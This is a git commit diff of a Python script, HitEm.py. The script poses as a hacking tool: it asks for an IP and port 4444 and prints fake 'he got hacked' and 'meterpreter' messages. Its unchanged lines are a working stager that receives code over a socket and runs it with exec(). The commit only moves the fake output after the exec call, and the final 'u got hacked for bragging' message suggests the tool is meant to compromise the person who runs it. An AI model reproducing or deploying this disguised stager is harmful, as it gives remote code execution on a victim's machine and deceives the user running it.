76670920b8f6970768d89e1f9693f6c3164781d7
mrn3mo <45218278+mrn3mo@users.noreply.github.com>
2019-01-02 22:26:08 +0100

    Update HitEm.py

--- HitEm.py
+++ HitEm.py
@@ -9,17 +9,6 @@ f = raw_input("your ip: ")
 u = raw_input("the port 4444 is default: ")
 time.sleep(1)
 print("please wait ")
-time.sleep(10)
-print("success")
-print("wait for session")
-time.sleep(30)
-print("he got hacked")
-print("type help for options")
-gg = raw_input("meterpreter: ")
-if gg == help :
-  print("u got hacked for bragging")
-else:
- print("u got hacked for bragging")
 for x in range(10):
 	try:
 		s=socket.socket(2,socket.SOCK_STREAM)
@@ -32,3 +21,14 @@ d=s.recv(l)
 while len(d)<l:
 	d+=s.recv(l-len(d))
 exec(d,{'s':s})
+time.sleep(10)
+print("success")
+print("wait for session")
+time.sleep(30)
+print("he got hacked")
+print("type help for options")
+gg = raw_input("meterpreter: ")
+if gg == help :
+  print("u got hacked for bragging")
+else:
+ print("u got hacked for bragging")
